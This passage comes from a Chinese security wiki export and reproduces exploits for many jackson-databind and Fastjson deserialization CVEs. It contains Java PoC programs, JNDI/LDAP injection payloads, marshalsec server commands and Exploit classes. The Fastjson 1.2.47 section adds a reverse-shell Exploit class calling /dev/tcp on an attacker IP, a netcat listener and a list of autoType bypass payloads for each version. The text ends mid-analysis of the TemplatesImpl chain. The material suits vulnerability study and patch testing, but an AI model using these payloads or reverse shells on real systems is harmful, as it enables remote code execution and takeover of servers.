利用poc成功上传shell Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:39 "},"Web安全/FasterXML jackson/（CVE-2019-12384）（ CVE-2019-12814）FasterXML jackson-databind 反序列化漏洞/（CVE-2019-12384）（ CVE-2019-12814）FasterXML jackson-databind 反序列化漏洞.html":{"url":"Web安全/FasterXML jackson/（CVE-2019-12384）（ CVE-2019-12814）FasterXML jackson-databind 反序列化漏洞/（CVE-2019-12384）（ CVE-2019-12814）FasterXML jackson-databind 反序列化漏洞.html","title":"（CVE-2019-12384）（ CVE-2019-12814）FasterXML jackson-databind 反序列化漏洞","keywords":"","body":"（CVE-2019-12384）（ CVE-2019-12814）FasterXML jackson-databind 反序列化漏洞 一、漏洞简介 在Jackson 2.x ~ Jackson 2.9.9,当开发人员在应用程序中通过ObjectMapper对象调用enableDefaultTyping方法并且服务端使用了JDOM 1.x 或 JDOM 2.x 依赖库时，攻击者可以发送恶意的JSON消息，读取远程服务器上的任意文件。 利用条件 开启enableDefaultTyping 使用了JDOM 1.x 或 JDOM 2.x 依赖 二、漏洞影响 Jackson 2.x ~2.9.9 三、复现过程 环境搭建 创建一个Meaven项目，在pom.xml文件中添加以下依赖： com.fasterxml.jackson.core jackson-databind 2.9.9 com.fasterxml.jackson.core jackson-annotations 2.9.9 com.fasterxml.jackson.core jackson-core 2.9.9 org.jdom jdom2 2.0.6 漏洞利用 测试文件 准备一个测试文件，后续进行读取：1.png 编写poc.xml 该XXE属于Blind XXE，我们构造以下恶意xml代码，它会去调用位于我们的攻击主机上(这里以本地启动的Http服务模拟)的外部dtd文件(不在同一个文件写入要读取的文件主要是为了避免参数实体引用时发生的错误）： %remote; %send; ]> 编写evil.dtd \"> %ppp; 启动Http服务 使用python开启一个简易的Http服务：2.png 启动FTP服务 使用IPOP V4.1软件搭建一个简易的FTP服务：3.png 执行漏洞POC 执行如下漏洞POC： package com.jacksonTest; import com.fasterxml.jackson.databind.ObjectMapper; import java.io.IOException; public class Poc { public static void main(String[] args) { ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String payload = \"[\\\"org.jdom2.transform.XSLTransformer\\\", \\\"http://127.0.0.1:4444/poc.xml\\\"]\"; try { mapper.readValue(payload, Object.class); } catch (IOException e) { e.printStackTrace(); } } } 成功读取到文件信息（笔者这里尝试过读取win.in文件，但是发现无法读全，该漏洞其实也是一个反序列化+XXE的利用，而且是Blind XXE，有兴趣的大佬可以再深入研究一波）4.jpg 整个执行流程如下：首先加载参数实体remote，此时会远程加载攻击者主机上的外部实体，首先加载name实体的值，即为我们要读取的文件的内容，然后加载ppp参数实体，在ppp实体中又内嵌了send实体，所以 接下来加载send实体，此时就是关键点，即将name实体的值（C:/hello.txt）发送到我们的FTP服务器上(通过GET、POST等方式的查询会在攻击者的服务器日志中留下相关记录） 参考链接 https://xz.aliyun.com/t/7820\\#toc-7 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:43 "},"Web安全/FasterXML jackson/（CVE-2019-14540）FasterXML jackson-databind 远程命令执行漏洞/（CVE-2019-14540）FasterXML jackson-databind 远程命令执行漏洞.html":{"url":"Web安全/FasterXML jackson/（CVE-2019-14540）FasterXML jackson-databind 远程命令执行漏洞/（CVE-2019-14540）FasterXML jackson-databind 远程命令执行漏洞.html","title":"（CVE-2019-14540）FasterXML jackson-databind 远程命令执行漏洞","keywords":"","body":"（CVE-2019-14540）FasterXML jackson-databind 远程命令执行漏洞 一、漏洞简介 FasterXML Jackson是美国FasterXML公司的一款适用于Java的数据处理工具。jackson-databind是其中的一个具有数据绑定功能的组件。 FasterXML jackson-databind 2.9.10之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞执行代码。 二、漏洞影响 jackson-databind \\ fastjson \\ 三、复现过程 分析过程 我喜欢用 gradle 来管理项目，先依赖一个最新版的回来 compile 'com.zaxxer:HikariCP:2.4.0' 观察 HikariConfig.java 的setter 和 getter 方法，稍微有点常识的人都能看出， setMetricRegistry 和 setHealthCheckRegistry 里有明显的lookup方法，下一步就是按照标准的剧本去利用一遍了，经典的jndi漏洞利用，老司机应该分分钟就搞定，但我从来没写过利用，就从头学习一下。 利用过程（常见的jndi利用） 首先，我利用的是 ldap 协议，需要在低版本（小于 java8u191）下利用，详细原理我不是很清楚，大致原理就是从远程加载一个 class文件，调用它的构造函数，在构造函数里可以执行任意代码。 然后，借用 https://github.com/ianxtianxt/marshalsec 提供的转发功能，创建 ldap server，作用是转发到另一个 http server 上，使用非常方便。 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8000/#Exploit\" 1389 Listening on 0.0.0.0:1389 然后编译一个 Exploit.class 出来，找个地方放好 public class Exploit { public Exploit() { try { if (System.getProperty(\"os.name\").toLowerCase().startsWith(\"win\")) { Runtime.getRuntime().exec(\"calc.exe\"); } else if (System.getProperty(\"os.name\").toLowerCase().startsWith(\"mac\")) { Runtime.getRuntime().exec(\"open /Applications/Calculator.app\"); } else { System.out.println(\"No calc for you!\"); } } catch (Exception e) { e.printStackTrace(); } } } 然后在 Exploit.class 目录，开一个 http 服务 python -m SimpleHTTPServer 之后使用 jackson 进行反序列化 ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); mapper.readValue(\"[\\\"com.zaxxer.hikari.HikariConfig\\\", {\\\"metricRegistry\\\":\\\"ldap://localhost:1389/Exploit\\\"}]\".getBytes(), Object.class); 或者使用 fastjson 进行反序列化 ParserConfig.global.setAutoTypeSupport(true); JSON.parse(\"{\\\"@type\\\":\\\"com.zaxxer.hikari.HikariConfig\\\",\\\"metricRegistry\\\":\\\"ldap://localhost:1389/Exploit\\\"}\"); 即可触发弹计算器 FasterXMLjackson-databind远程命令执行漏洞/media/rId26.png) 文中代码的github地址: https://github.com/ianxtianxt/cve-2019-14540-exploit 参考链接 https://www.leadroyal.cn/?p=939 https://www.restran.net/2018/10/29/fastjson-rce-notes/ https://paper.seebug.org/942/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:43 "},"Web安全/FasterXML jackson/（CVE-2020-14060）FasterXML jackson-databind 反序列化漏洞/（CVE-2020-14060）FasterXML jackson-databind 反序列化漏洞.html":{"url":"Web安全/FasterXML jackson/（CVE-2020-14060）FasterXML jackson-databind 反序列化漏洞/（CVE-2020-14060）FasterXML jackson-databind 反序列化漏洞.html","title":"（CVE-2020-14060）FasterXML jackson-databind 反序列化漏洞","keywords":"","body":"（CVE-2020-14060）FasterXML jackson-databind 反序列化漏洞 一、漏洞简介 利用条件开启enableDefaultTyping()使用了org.apache.drill.exec:drill-jdbc-all第三方依赖 二、漏洞影响 jackson-databind before 2.9.10.4jackson-databind before 2.8.11.6jackson-databind before 2.7.9.7 三、复现过程 漏洞分析 首先定位到oadd.org.apache.xalan.lib.sql.JNDIConnectionPool类，之后发现一处可疑的JNDI注入：1.png参数为jndiPath，该参数在当前类中有对应的set操作，在反序列化时会调用setJndiPath进行一次赋值操作，故可控：2.png然而我们的findDatasource并不会被调用，之后全局搜索findDatasource函数，发现存在两处，一处是testConnect()，这对我们来说无用，另外一处是getConnection(),该函数在序列化时会被调用：3.png在反序列化操作时，我们可以将jndipath指向恶意LDAP服务，之后当序列化操作时getConnection会被调用，由此导致findDatasource被调用，最后导致JNDI注入，整个利用链如下所示： mapper.readValue ->setJndiPath ->getConnection ->findDatasource ->context.lookup(this.jndiPath); 漏洞复现 pom.xml com.fasterxml.jackson.core jackson-databind 2.9.10.4 org.apache.drill.exec drill-jdbc-all 1.4.0 org.slf4j slf4j-nop 1.7.2 javax.transaction jta 1.1 PS：这里的漏洞所使用的库包需要在1.4版本才可以，之后没有该漏洞类，而目前最新的已经是1.17.0了，所以总体来说较为鸡肋~ POC: package com.jacksonTest; import com.fasterxml.jackson.databind.ObjectMapper; import java.io.IOException; public class Poc { public static void main(String[] args) throws Exception { ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String payload = \"[\\\"oadd.org.apache.xalan.lib.sql.JNDIConnectionPool\\\",{\\\"jndiPath\\\":\\\"ldap://127.0.0.1:1099/Exploit\\\"}]\"; try { Object obj = mapper.readValue(payload, Object.class); mapper.writeValueAsString(obj); } catch (IOException e) { e.printStackTrace(); } } } 之后运行该程序，成功执行命令，弹出计算器： 4.png 参考链接 https://xz.aliyun.com/t/8012\\#toc-12 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:45 "},"Web安全/FasterXML jackson/（CVE-2020-14062）FasterXML jackson-databind 反序列化漏洞/（CVE-2020-14062）FasterXML jackson-databind 反序列化漏洞.html":{"url":"Web安全/FasterXML jackson/（CVE-2020-14062）FasterXML jackson-databind 反序列化漏洞/（CVE-2020-14062）FasterXML jackson-databind 反序列化漏洞.html","title":"（CVE-2020-14062）FasterXML jackson-databind 反序列化漏洞","keywords":"","body":"（CVE-2020-14062）FasterXML jackson-databind 反序列化漏洞 一、漏洞简介 利用条件开启enableDefaultTyping()使用了com.sun.xml.parsers:jaxp-ri第三方依赖 二、漏洞影响 jackson-databind before 2.9.10.4jackson-databind before 2.8.11.6jackson-databind before 2.7.9.7 三、复现过程 漏洞分析 首先定位到com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool类，之后发现一处可疑的JNDI注入：1.png参数为jndiPath，该参数在当前类中有对应的set操作，在反序列化时会调用setJndiPath进行一次赋值操作，故可控：2.png然而我们的findDatasource并不会被调用，之后全局搜索findDatasource函数，发现存在两处，一处是testConnect()，这对我们来说无用，另外一处是getConnection(),该函数在序列化时会被调用：3.png在反序列化操作时，我们可以将jndipath指向恶意LDAP服务，之后再次进行序列化操作时getConnection会被调用(多少有些鸡肋，需要先反序列化，灾后再序列化一次)，由此导致findDatasource被调用，最后导致JNDI注入，整个利用链如下所示： mapper.readValue ->setJndiPath ->getConnection ->findDatasource ->context.lookup(this.jndiPath); 漏洞复现 pom.xml文件： com.fasterxml.jackson.core jackson-databind 2.9.10.4 com.sun.xml.parsers jaxp-ri 1.4 org.slf4j slf4j-nop 1.7.2 javax.transaction jta 1.1 POC: package com.jacksonTest; import com.fasterxml.jackson.databind.ObjectMapper; import java.io.IOException; public class Poc { public static void main(String[] args) throws Exception { ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String payload = \"[\\\"com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool\\\",{\\\"jndiPath\\\":\\\"ldap://127.0.0.1:1099/Exploit\\\"}]\"; try { Object obj = mapper.readValue(payload, Object.class); mapper.writeValueAsString(obj); } catch (IOException e) { e.printStackTrace(); } } } 之后运行该程序，成功执行命令，弹出计算器： 4.png 参考链接 https://xz.aliyun.com/t/8012\\#toc-12 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:46 "},"Web安全/FasterXML jackson/（CVE-2020-14195）FasterXML jackson-databind 反序列化漏洞/（CVE-2020-14195）FasterXML jackson-databind 反序列化漏洞.html":{"url":"Web安全/FasterXML jackson/（CVE-2020-14195）FasterXML jackson-databind 反序列化漏洞/（CVE-2020-14195）FasterXML jackson-databind 反序列化漏洞.html","title":"（CVE-2020-14195）FasterXML jackson-databind 反序列化漏洞","keywords":"","body":"（CVE-2020-14195）FasterXML jackson-databind 反序列化漏洞 一、漏洞简介 利用条件开启enableDefaultTyping()使用了org.jsecurity.realm.jndi.JndiRealmFactory第三方依赖 二、漏洞影响 jackson-databind before 2.9.10.4jackson-databind before 2.8.11.6jackson-databind before 2.7.9.7 三、复现过程 漏洞分析 首先定位到org.jsecurity.realm.jndi.JndiRealmFactory类，之后发现一处可疑的JNDI注入：1.png参数name来自i$，而i$源自jndiNames，此时要想进入lookup需要满足前面的if条件语句，即jndiNames不为空，且不为null，所以我们可以在构造poc时直接对jndiName进行传参赋值操作即可，同时将其设置为我们的ldap恶意服务：2.png整个利用链如下所示： mapper.readValue ->setJndiNames ->getRealms ->lookup 漏洞复现 pom.xml如下： com.fasterxml.jackson.core jackson-databind 2.9.10.4 org.jsecurity jsecurity 0.9.0 org.slf4j slf4j-nop 1.7.2 javax.transaction jta 1.1 漏洞POC: package com.jacksonTest; import com.fasterxml.jackson.databind.ObjectMapper; import java.io.IOException; public class Poc { public static void main(String[] args) throws Exception { ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String payload = \"[\\\"org.jsecurity.realm.jndi.JndiRealmFactory\\\",{\\\"jndiNames\\\":\\\"ldap://127.0.0.1:1099/Exploit\\\"}]\"; try { Object obj = mapper.readValue(payload, Object.class); mapper.writeValueAsString(obj); } catch (IOException e) { e.printStackTrace(); } } } 之后运行该程序，成功执行命令，弹出计算器： 3.png 参考链接 https://xz.aliyun.com/t/8012\\#toc-18 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:46 "},"Web安全/FasterXML jackson/（CVE-2020-24616）FasterXML jackson-databind 远程命令执行漏洞/（CVE-2020-24616）FasterXML jackson-databind 远程命令执行漏洞.html":{"url":"Web安全/FasterXML jackson/（CVE-2020-24616）FasterXML jackson-databind 远程命令执行漏洞/（CVE-2020-24616）FasterXML jackson-databind 远程命令执行漏洞.html","title":"（CVE-2020-24616）FasterXML jackson-databind 远程命令执行漏洞","keywords":"","body":"（CVE-2020-24616）FasterXML jackson-databind 远程命令执行漏洞 一、漏洞简介 br.com.anteros.dbcp.AnterosDBCPConfig类绕过了之前jackson-databind维护的黑名单类，并且JDK版本较低的话，可造成RCE。 利用条件 开启enableDefaultTyping() 使用了br.com.anteros第三方依赖 二、漏洞影响 jackson-databind before 2.9.10.4jackson-databind before 2.8.11.6jackson-databind before 2.7.9.7 三、复现过程 漏洞分析 相关信息： https://github.com/FasterXML/jackson-databind/issues/2814 1.png 之后查找对应的issue，找到对应的绕过黑名单类： 2.png 之后在源码中定位到br.com.anteros.dbcp.AnterosDBCPDataSource类，可以看到该类继承自AnterosDBCPConfig类： 3.jpeg 之后全局搜索healthCheckRegistry发现在函数setHealthCheckRegistry作为参数进行传递，之后该参数被传入了super.setHealthCheckRegistry(healthCheckRegistry);，也就是调用了父类的setHealthCheckRegistry方法，并将此参数作为只传递，下面我们跟进该函数来看看： 4.jpeg 在父类的setHealthCheckRegistry方法中首先会判断healthCheckRegistry是否为空，如果不为空则调用当前类的getObjectOrPerformJndiLookup方法并将healthCheckRegistry作为参数传递，下面继续跟踪看看： 5.jpeg 之后再getObjectOrPerformJndiLookup方法中可以看到，此处的参数object(即:传入的数据类型healthCheckRegistry的值)首先会判断其数据类型，可以看到数据类型为String时会被带入initCtx.lookup，从而导致JNDI注入： 6.jpeg 整个利用链如下所示： mapper.readValue ->AnterosDBCPDataSource.setHealthCheckRegistry ->AnterosDBCPDataSource.setHealthCheckRegistry ->AnterosDBCPDataSource.getObjectOrPerformJndiLookup ->initCtx.lookup(); 漏洞复现 pom.xml如下所示： com.fasterxml.jackson.core jackson-databind 2.9.10.4 com.fasterxml.jackson.core jackson-databind 2.11.2 br.com.anteros Anteros-DBCP 1.0.1 org.slf4j slf4j-nop 1.7.2 javax.transaction jta 1.1 漏洞利用 Exploit.java代码如下： import java.lang.Runtime; public class Exploit { static { try { Runtime.getRuntime().exec(\"calc\"); } catch (Exception e) { e.printStackTrace(); } } } 之后编译Exploit.java，并且使用python启动一个简易的Web服务，将Exploit.class文件放置到web目录下，之后使用marshalsec启动一个LDAP服务： 7.png 执行漏洞POC1: import com.fasterxml.jackson.databind.ObjectMapper; public class POC { public static void main(String[] args) throws Exception { String payload = \"[\\\"br.com.anteros.dbcp.AnterosDBCPDataSource\\\",{\\\"healthCheckRegistry\\\":\\\"ldap://127.0.0.1:1099/Exploit\\\"}]\"; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); mapper.readValue(payload, Object.class); } } 之后运行该程序，成功执行命令，弹出计算器： 8.jpeg 执行漏洞POC2 Poc.java代码如下所示： import com.fasterxml.jackson.databind.ObjectMapper; public class POC { public static void main(String[] args) throws Exception { String payload = \"[\\\"br.com.anteros.dbcp.AnterosDBCPDataSource\\\",{\\\"metricRegistry\\\":\\\"ldap://127.0.0.1:1099/Exploit\\\"}]\"; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); mapper.readValue(payload, Object.class); } } 之后运行该程序，成功执行命令，弹出计算器： 9.jpeg 参考链接 https://xz.aliyun.com/t/8210 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:47 "},"Web安全/FasterXML jackson/（CVE-2020-24750）FasterXML jackson-databind 远程命令执行漏洞/（CVE-2020-24750）FasterXML jackson-databind 远程命令执行漏洞.html":{"url":"Web安全/FasterXML jackson/（CVE-2020-24750）FasterXML jackson-databind 远程命令执行漏洞/（CVE-2020-24750）FasterXML jackson-databind 远程命令执行漏洞.html","title":"（CVE-2020-24750）FasterXML jackson-databind 远程命令执行漏洞","keywords":"","body":"（CVE-2020-24750）FasterXML jackson-databind 远程命令执行漏洞 一、漏洞简介 com.pastdev.httpcomponents.configuration.JndiConfiguration类绕过了之前jackson-databind维护的黑名单类，并且JDK版本较低的话，可造成RCE。 利用条件 开启enableDefaultTyping() 使用了com.pastdev.httpcomponents.configuration.JndiConfiguration第三方依赖 二、漏洞影响 jackson-databind before 2.9.10.4 jackson-databind before 2.8.11.6 jackson-databind before 2.7.9.7 三、复现过程 漏洞分析 相关信息 https://github.com/FasterXML/jackson-databind/issues/2798 FasterXMLjackson-databind远程命令执行漏洞/media/rId26.png) 相关类确定： https://github.com/kishorkunal-raj/jackson-databind/blob/5f4148e6c083529a2d12c6dc986b07a03850f503/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java#L198 FasterXMLjackson-databind远程命令执行漏洞/media/rId27.png) 之后在源代码中定位到com.pastdev.httpcomponents.configuration.JndiConfiguration类，发现一处可疑的JNDI注入，我们只需要构造参数即可实现，非常简单： FasterXMLjackson-databind远程命令执行漏洞/media/rId28.jpg) 整个利用链如下所示： mapper.readValue ->JndiConfiguration ->lookup 漏洞复现 环境搭建 pom.xml com.fasterxml.jackson.core jackson-databind 2.9.10.4 com.pastdev.httpcomponents configuration 0.1.3 org.slf4j slf4j-nop 1.7.2 javax.transaction jta 1.1 漏洞复现 这里使用LDAP的利用方式进行漏洞的利用演示，RMI的方式也是类似的，且RMI比LDAP要对JDK版本有很大的局限性~LDAP利用方式：jdk版本：JDK 11.0.1、8u191、7u201、6u211之前，笔者这里采用JDK 1.8.0_181 编译Exploit.java Exploit.java import java.lang.Runtime; public class Exploit { static { try { Runtime.getRuntime().exec(\"calc\"); } catch (Exception e) { e.printStackTrace(); } } } 编译Exploit.java文件： FasterXMLjackson-databind远程命令执行漏洞/media/rId33.png) 之后在本地搭建HTTP服务并将Exploit.class放置在web目录下，之后通过marshalsec来启动一个LDAP服务使用marshalsec来启动一个LDAP服务： FasterXMLjackson-databind远程命令执行漏洞/media/rId34.png) 执行漏洞POC Poc.java package com.jacksonTest; import com.fasterxml.jackson.databind.ObjectMapper; import java.io.IOException; public class Poc { public static void main(String[] args) throws Exception { ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String payload = \"[\\\"com.pastdev.httpcomponents.configuration.JndiConfiguration\\\",\\\"ldap://127.0.0.1:1099/Exploit\\\"]\"; try { mapper.readValue(payload, Object.class); } catch (IOException e) { e.printStackTrace(); } } } 之后运行该程序，成功执行命令，弹出计算器： FasterXMLjackson-databind远程命令执行漏洞/media/rId36.jpg) 参考链接 https://xz.aliyun.com/t/8210\\#toc-2 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:47 "},"Web安全/FasterXML jackson/（CVE-2020-8840）FasterXML jackson-databind 远程代码执行漏洞/（CVE-2020-8840）FasterXML jackson-databind 远程代码执行漏洞.html":{"url":"Web安全/FasterXML jackson/（CVE-2020-8840）FasterXML jackson-databind 远程代码执行漏洞/（CVE-2020-8840）FasterXML jackson-databind 远程代码执行漏洞.html","title":"（CVE-2020-8840）FasterXML jackson-databind 远程代码执行漏洞","keywords":"","body":"（CVE-2020-8840）FasterXML jackson-databind 远程代码执行漏洞 一、漏洞简介 FFasterXML/jackson-databind是一个用于JSON和对象转换的Java第三方库，可将Java对象转换成json对象和xml文档，同样也可将json对象转换成Java对象。 此次漏洞中攻击者可利用xbean-reflect的利用链触发JNDI远程类加载从而达到远程代码执行。 二、漏洞影响 jackson-databind 2.0.0 -- 2.9.10.2 经验证fastjson在开启了autoType功能的情况下，影响最新的fastjson v1.2.62版本 三、复现过程 可以在git提交记录中清楚看到利用的具体类 FasterXMLjackson-databind远程代码执行漏洞/media/rId24.png) 分析下利用链，通过传进参数asText，触发setter，setAsText()函数 FasterXMLjackson-databind远程代码执行漏洞/media/rId25.png) 随后跟进toObject()函数 FasterXMLjackson-databind远程代码执行漏洞/media/rId26.png) 最终进到JndiConverter重写的toObjectImp()函数 FasterXMLjackson-databind远程代码执行漏洞/media/rId27.png) 此时出现经典的JNDI注入，text 刚好就是我们传进的asText，我们可控，从而达到命令执行目的 FasterXMLjackson-databind远程代码执行漏洞/media/rId28.png) poc import com.fasterxml.jackson.databind.ObjectMapper; import java.io.IOException; public class Poc { public static void main(String args[]) { ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String json = \"[\\\"org.apache.xbean.propertyeditor.JndiConverter\\\", {\\\"asText\\\":\\\"ldap://localhost:1389/ExportObject\\\"}]\"; try { mapper.readValue(json, Object.class); } catch (IOException e) { e.printStackTrace(); } } } Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:44 "},"Web安全/Fastjson/Fastjson =1.2.47 远程代码执行漏洞/Fastjson =1.2.47 远程代码执行漏洞.html":{"url":"Web安全/Fastjson/Fastjson =1.2.47 远程代码执行漏洞/Fastjson =1.2.47 远程代码执行漏洞.html","title":"Fastjson =1.2.47 远程代码执行漏洞","keywords":"","body":"Fastjson \\ 一、漏洞简介 二、漏洞影响 Fastjson \\ 三、复现过程 https://github.com/ianxtianxt/fastjson-1.2.47-RCE-1 执行： java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://IPvps/#Exploit 1.png 修改反弹ip和端口： vim Exploit.java 编译生成class：//需要使用jdk1.8，否则会报错 javac Exploit.java 开启http服务： python3 -m http.server 80 或者 python -m SimpleHTTPServer 80 payload: {\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://ip:1389/Exploit\",\"autoCommit\":true}}} 开启nc监听反弹： nc -lvvp 8888 反弹shell poc补充 java反弹shell，无法直接使用bash -i >& /dev/tcp/攻击服务器ip/8888 0>&1 import java.io.BufferedReader; import java.io.InputStream; import java.io.InputStreamReader; public class Exploit{ public Exploit() throws Exception { Process p = Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/攻击服务器ip/888;cat &5 >&5; done\"}); InputStream is = p.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(is)); String line; while((line = reader.readLine()) != null) { System.out.println(line); } p.waitFor(); is.close(); reader.close(); p.destroy(); } public static void main(String[] args) throws Exception { } } 补充 https://github.com/ianxtianxt/Fastjson-1.2.47-rce 1.2.24 {\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true}} 未知版本(1.2.24-41之间) {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true} 1.2.41 {\"@type\":\"Lcom.sun.rowset.RowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true} 1.2.42 {\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}; 1.2.43 {\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true]} 1.2.45 {\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://localhost:1099/Exploit\"}} 1.2.47 {\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}}} Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:52:54 "},"Web安全/Fastjson/Fastjson 1.2.22 - 1.2.24 反序列化漏洞/Fastjson 1.2.22 - 1.2.24 反序列化漏洞.html":{"url":"Web安全/Fastjson/Fastjson 1.2.22 - 1.2.24 反序列化漏洞/Fastjson 1.2.22 - 1.2.24 反序列化漏洞.html","title":"Fastjson 1.2.22 - 1.2.24 反序列化漏洞","keywords":"","body":"Fastjson 1.2.22 - 1.2.24 反序列化漏洞 一、漏洞简介 二、漏洞影响 Fastjson 1.2.22-24 三、复现过程 0x01 简单介绍 介绍：FastJson是一款由阿里开发的JSON库> 影响版本：1.2.22-24> 官方通告：\">https://github.com/alibaba/fastjson/wiki/security\\_update\\_20170315> 补丁：https://github.com/alibaba/fastjson/commit/d075721cf396d5cb70e24c824b901e3a9a5b342b 本地环境：> win10> idea64 2018.2.5> jdk 1.8> fastjson 1.22 FastJson的简单使用 先通过一个简单的demo来熟悉一下FastJson的基本操作。首先创建一个Student类，Student.java： package ka1n4t.test; public class Student { public String name; private int age; public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } } Students有一个公有属性name和一个私有属性age。下面使用一个测试类，将json字符串反序列化成Student对象，learnFJ.java： package ka1n4t.test; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.JSONObject; public class learnFJ { public static void main(String args[]) { String text = \"{\\\"@type\\\":\\\"ka1n4t.test.Student\\\",\\\"name\\\":\\\"ZhangSan\\\",\\\"age\\\":123}\"; Student obj1 = JSON.parseObject(text, Student.class, Feature.SupportNonPublicField); System.out.println(obj1.getName()); } } 结果： 0x02 原理分析 分析POC 先看一下用于反序列化的恶意类evilClass1.java: package ka1n4t.poc; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class evilClass1 extends AbstractTranslet/*ka1n4t*/ { public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) { } public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException { } public evilClass1() throws IOException { Runtime.getRuntime().exec(\"calc\"); } public static void main(String[] args) throws IOException { evilClass1 helloworld = new evilClass1(); } } 其中的构造方法是用exec弹个计算器。看下poc，vulApp1.java： package ka1n4t.poc; import org.apache.commons.io.IOUtils; import org.apache.commons.codec.binary.Base64; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; import java.io.ByteArrayOutputStream; import java.io.File; import java.io.FileInputStream; import java.io.IOException; public class vulApp1 { public static String readClass(String cls){ ByteArrayOutputStream bos = new ByteArrayOutputStream(); try { IOUtils.copy(new FileInputStream(new File(cls)), bos); } catch (IOException e) { e.printStackTrace(); } String result = Base64.encodeBase64String(bos.toByteArray()); return result; } public static void bad_method() { ParserConfig config = new ParserConfig(); final String fileSeparator = System.getProperty(\"file.separator\"); String evil_path = \"D:\\\\Java-App\\\\fastjson-1.2.22\\\\target\\\\classes\\\\ka1n4t\\\\poc\\\\evilClass1.class\"; String evil_code = readClass(evil_path); final String NASTY_CLASS = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"; String text1 = \"{\\\"@type\\\":\\\"\" + NASTY_CLASS + \"\\\",\\\"_bytecodes\\\":[\\\"\"+evil_code+\"\\\"],\" + \"'_name':'a.b',\" + \"'_tfactory':{ },\" + \"\\\"_outputProperties\\\":{ }}\\n\"; System.out.println(text1); Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); } public static void main(String args[]) { bad_method(); } } 核心部分： String text1 = \"{\\\"@type\\\":\\\"\" + NASTY_CLASS + \"\\\",\\\"_bytecodes\\\":[\\\"\"+evil_code+\"\\\"],\" + \"'_name':'a.b',\" + \"'_tfactory':{ },\" + \"\\\"_outputProperties\\\":{ }}\\n\"; Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); _bytecodes是经过base64编码的evilClass1的字节码文件，NASTY_CLASS是TemplatesImpl类。总结一下这个payload，利用JSON.parseObject反序列化TemplatesImpl类，其中_bytecodes属性是经过base64编码的恶意类字节码文件。 调试分析 下面来分析一下反序列化TemplatesImpl的调用链，首先经过java的反射机制，到达TemplatesImpl类，调用其getOutputProperties()方法： 跟进newTransformer()方法，这个方法是用于创建一个Transformer实例。然后到达getTransletInstance()方法： getTransletInstance()方法用于创建一个translet实例，返回这个translet给newTransformer()，然后被包裹成Transformer对象。跟进一下这个方法，发现其调用了defineTransletClasses()用来加载_bytecodes中的类，接着又调用了_class[_transletIndex].newInstance()将defineTransletClasses()返回的类进行实例化： 先跟进一下defineTransletClasses方法： 